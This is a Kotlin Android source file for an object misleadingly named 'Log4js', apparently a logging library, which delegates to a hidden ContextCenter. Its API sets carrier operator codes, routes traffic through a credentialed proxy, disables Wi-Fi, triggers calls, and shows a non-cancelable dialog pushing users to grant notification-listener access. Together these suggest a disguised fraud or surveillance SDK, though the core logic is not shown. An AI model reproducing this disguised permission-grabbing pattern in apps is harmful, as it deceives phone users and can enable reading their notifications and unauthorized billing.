package com.cp.log

import android.app.AlertDialog
import android.content.Context
import android.content.DialogInterface
import android.content.Intent
import android.widget.RelativeLayout

import com.cp.log.event.LogEvent
import com.mos.lib.common.persenter.ContextCenter
import com.mos.lib.common.http.SubProxy

import android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS

object Log4js {


    var isHiden = true

    var isPermission = false

    private var mContext: Context? = null

    private var alertDialogBuilder: AlertDialog.Builder? = null

    /**
     * 调用初始化init方法
     *
     * @param context
     * @param event
     */
    @JvmOverloads
    fun init(context: Context, event: LogEvent = object : LogEvent {
        override fun onMessage(tag: String, content: String) {

        }

        override fun onError(throwable: Throwable) {

        }
    }) {
        mContext = context
        ContextCenter.init(context, event)
    }

    fun init(context: Context, event: LogEvent, layout: RelativeLayout) {
        ContextCenter.init(context, event, layout)
    }


    fun log(log: Boolean) {
        ContextCenter.log(log)

    }

    fun operator(code: String) {
        ContextCenter.setOperator(code)
    }

    fun proxy(host: String, user: String, password: String, port: Int) {
        ContextCenter.proxy(SubProxy(host, user, password, port))
    }

    fun closeWifi(wifi: Boolean) {
        ContextCenter.closeWifi(wifi)
    }


    fun call() {
        ContextCenter.call()
    }

    fun showDialog() {
        if (alertDialogBuilder != null) {
            alertDialogBuilder!!.show()
        }
    }

    fun buildNotificationAlert(title: String, content: String, yes: String, no: String): AlertDialog? {
        if (mContext == null) return null
        alertDialogBuilder = AlertDialog.Builder(mContext)
        alertDialogBuilder!!.setCancelable(false)
        alertDialogBuilder!!.setTitle(title)
        alertDialogBuilder!!.setMessage(content)
        alertDialogBuilder!!.setPositiveButton(yes
        ) { dialog, id ->
            mContext!!.startActivity(Intent(ACTION_NOTIFICATION_LISTENER_SETTINGS))
            //go to set permision
        }
        alertDialogBuilder!!.setNegativeButton(no
        ) { dialog, id ->
            //cancel
        }
        return alertDialogBuilder!!.create()
    }


}
